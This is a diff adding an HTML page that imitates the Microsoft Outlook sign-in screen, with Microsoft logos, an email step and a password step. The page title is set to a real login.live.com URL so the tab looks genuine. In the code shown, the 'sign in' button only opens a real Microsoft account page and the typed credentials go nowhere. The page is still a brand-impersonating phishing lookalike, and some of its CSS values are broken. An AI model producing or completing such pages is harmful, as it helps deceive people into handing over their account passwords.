@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta http-equiv="X-UA-Compatible" content="ie=edge">
+        <title>https://login.live.com/login.srf?id=292841&opid=40CACFB6D63A75BB&opidt=1712756949&uaid=ee3b6812407b4004bcc5603af05a70bc&lc=3081</title>
+        
+        <style>
+                *{
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: Arial, Helvetica, sans-serif;
+}
+body{
+        background: #F1860;
+        display: grid;
+        justify-content: center;
+        place-items: center;
+       position: relative;
+       top: 23px;
+        
+      
+}
+.container{
+        top: 20px;
+        height: 400px;
+        width: 450px;
+       background: #fff;
+      position: relative;
+      padding: 44px;
+      box-shadow: 0 0.5rem rgba(0,*0,*0,*3);
+      overflow: hidden;
+      
+}
+h2{
+        position: relative;
+        bottom: 35px;
+  
+}
+.logo{
+         margin-bottom: 40px;
+}
+form input{
+    width: 360px;
+    height: 35px;
+    font-size: 17px;
+    border: none;
+    outline: none;
+    border-bottom: 2px solid gray;
+    margin: 0.5rem;
+}
+
+
+btn{
+        display: inline-block;
+        margin-left: auto;
+}
+button{
+        border: none;
+        outline: none;
+        height: 29px;
+        width: 90px;
+        background: #0067b8;
+        color: white;
+        cursor: pointer;
+        margin-top: 65px;
+        
+}
+a{
+        color: #0067b8;
+        text-decoration: none;
+}
+a:hover{
+        text-decoration: none;
+}
+button:hover{
+        background: #004b85;
+        border: 4px dashed black;
+}
+.btn{
+        position: absolute;
+       left: 300px;
+}
+.bottom{
+        border: 1px solid black;
+        width: 450px;
+        height: 60px;
+        display: flex;
+        align-items: center;
+        margin: 20px;
+        background: #fff;
+        justify-items: center;
+        padding: 8px 44px;
+        cursor: pointer;
+        font-size: 15px;
+}
+form {
+      position: absolute; 
+      transition: 0.5s;
+}
+#form2{
+        left: 450px;
+}
+.bottom_image{
+        margin-right: 12px;
+        height: 30px;
+        
+
+}
+.arrow{
+        position: relative;
+        bottom: 36px;
+}
+#back_btn{
+        position: relative;
+        font-size: 19px;
+        cursor: pointer;
+        display: inline-flex;
+        text-align: center;
+        height: 25px;
+        width: 25px;
+        
+}
+#back_btn:hover{
+        border: 2px solid black;
+        background: dimgray;
+        border-radius: 50%;
+}
+.ps{
+        
+        position: relative;
+        bottom: 31px;
+}
+#validate{
+        color: red;
+}
+        </style>
+</head>
+<body>
+        
+         <img class="outlook" src="/img/53_7a3c80bf9694448bac31a9589d2e9e92 (1).png" alt="" width="160px">
+                       
+                       
+        <div class="container">
+               
+               
+               <form id="form1">
+<img class="logo" src="/img/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="">
+
+<h2>sign in</h2>
+<p class="ps">to continue to outlook</p>
+<p id="validate"></p>
+
+<div class="input_1">
+        <input type="email" id="email"placeholder ="Email,phone, or Skype" required>
+</div>
+<p>No account?<a href="#">create one!</a></p>
+<div class="btn">
+        <button id="next_btn">Next</button>
+</div>
+                </form>
+               
+               
+<form id="form2">
+<img class="logo" src="/img/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="">
+<p class="arrow"><span id="back_btn">&#8592</span><span id="mail"></span></p>
+<h2>Enter password</h2>
+
+
+<div class="input_1">
+        <input type="password" id="password"placeholder ="password" required>
+</div>
+<a href="#">forgot password?</a>
+<div class="btn">
+        <button id="login_btn">sign in</button>
+</div>
+                </form>
+        </div>
+     
+<script>
+        var form1 = document.querySelector("#form1")
+        var form2 = document.querySelector("#form2")
+        var form1_input = document.querySelector("#form1 input")
+        
+        var validate = document.querySelector("#validate")
+        
+        var next_btn = document.querySelector("#next_btn")
+        var back_btn = document.querySelector("#back_btn")
+        
+        var mail = document.querySelector("#mail")
+        var login_btn = document.querySelector("#login_btn")
+        
+        next_btn.onclick = function(e){
+                e.preventDefault()
+                if(email.value==""){
+                        validate.innerHTML = "Enter a valid email address, phone number, or Skype name."
+                }else{
+                
+                form1.style.left = "-450px"
+                form2.style.left = "40px"
+                
+                mail.innerHTML = form1_input.value
+                } if(password.value==""){
+                        validate.innerHTML = "Enter a valid email address, phone number, or Skype name."
+                }
+        }
+        
+        back_btn.onclick = function(){
+                form2.style.left = "450px"
+                form1.style.left = "40px"
+        }
+        
+        login_btn.onclick = function(e) {
+                e.preventDefault()
+                
+                if(password.value==""){
+                        validate.innerHTML = "Enter a valid email address, phone number, or Skype name."
+                }else{
+                        window.open("https://account.live.com/proofs/Add?mkt=EN-AU&uiflavor=web&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&id=292841&mpcxt=CATB&ru=https://login.live.com/login.srf%3fid%3d292841%26opid%3d1FC16BDD73AD0239%26opidt%3d1713041625")
+                }
+                
+        }
+        
+</script>
+
+</body>
+</html>
